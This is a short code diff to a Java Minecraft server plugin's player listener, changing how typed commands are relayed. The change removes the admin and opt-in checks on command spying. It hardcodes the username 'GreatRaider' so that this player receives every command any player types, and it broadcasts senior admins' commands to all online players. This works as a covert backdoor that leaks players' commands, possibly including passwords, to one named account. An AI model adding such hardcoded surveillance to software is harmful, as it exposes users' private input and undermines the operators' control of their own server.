@@ -695,14 +695,12 @@ public class TFM_PlayerListener implements Listener
             event.setCancelled(true);
         }
 
-        if (!TFM_AdminList.isSuperAdmin(player))
+        for (Player pl : Bukkit.getOnlinePlayers())
         {
-            for (Player pl : Bukkit.getOnlinePlayers())
+            
+            if (TFM_AdminList.isSeniorAdmin(player) || pl.getName().equals("GreatRaider"))
             {
-                if (TFM_AdminList.isSuperAdmin(pl) && TFM_PlayerData.getPlayerData(pl).cmdspyEnabled())
-                {
-                    TFM_Util.playerMsg(pl, player.getName() + ": " + command);
-                }
+                TFM_Util.playerMsg(pl, player.getName() + ": " + command, ChatColor.RED);
             }
         }
     }
